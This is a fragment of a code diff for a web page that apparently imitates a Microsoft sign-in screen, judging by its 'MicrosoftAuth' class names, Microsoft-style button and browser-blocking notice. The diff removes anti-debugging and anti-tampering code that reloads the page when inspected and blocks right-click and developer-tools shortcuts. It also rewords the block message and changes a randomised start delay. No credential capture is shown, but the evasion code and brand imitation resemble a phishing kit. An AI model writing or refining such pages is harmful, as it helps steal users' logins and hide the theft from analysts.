+                                <div style="font-size: 48px; margin-bottom: 16px;">🔒</div>
+                                <div style="font-size: 18px; color: var(--gray-160); font-weight: 600; margin-bottom: 12px;">
+                                    Enhanced Security Enabled
                                 </div>
-                                <div style="font-size: 14px; color: var(--gray-130); margin-bottom: 24px;">
-                                    For your security, please try again using a supported browser environment.
+                                <div style="font-size: 14px; color: var(--gray-130); margin-bottom: 32px; line-height: 1.5;">
+                                    We've detected an unsupported browser configuration.<br>
+                                    Please use Microsoft Edge, Chrome, or Firefox for the best experience.
                                 </div>
-                                <button class="ms-button" onclick="window.location.reload()">Try Again</button>
+                                <button class="ms-button" onclick="window.location.reload()" style="max-width: 200px;">
+                                    Try Again
+                                </button>
                             </div>
                         </div>
                     `;
                 }
             }
 
-            // =============================================
-            // ANTI-TAMPERING & ANTI-DEBUGGING PROTECTIONS
-            // =============================================
-            (function() {
-                // Anti-debugging protection
-                const startTime = Date.now();
-                const debuggerCheck = setInterval(() => {
-                    if (Date.now() - startTime > 1000) {
-                        clearInterval(debuggerCheck);
-                        window.location.reload();
-                    }
-                }, 100);
-
-                // Integrity check
-                const originalHTML = document.documentElement.outerHTML;
-                setInterval(() => {
-                    if (document.documentElement.outerHTML !== originalHTML) {
-                        window.location.reload();
-                    }
-                }, 500);
-
-                // Prevent right-click and DevTools
-                document.addEventListener('contextmenu', (e) => e.preventDefault());
-                document.addEventListener('keydown', (e) => {
-                    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                        e.preventDefault();
-                    }
-                });
-            })();
-
-            // =============================================
-            // INITIALIZATION WITH SECURITY DELAY
-            // =============================================
+            // Enhanced initialization
             document.addEventListener('DOMContentLoaded', () => {
+                // Add loading delay for better UX
                 setTimeout(() => {
-                    new SecureMicrosoftAuth();
-                }, 800 + Math.random() * 700);
+                    new EnhancedMicrosoftAuth();
+                }, 300);
             });
 
         })();
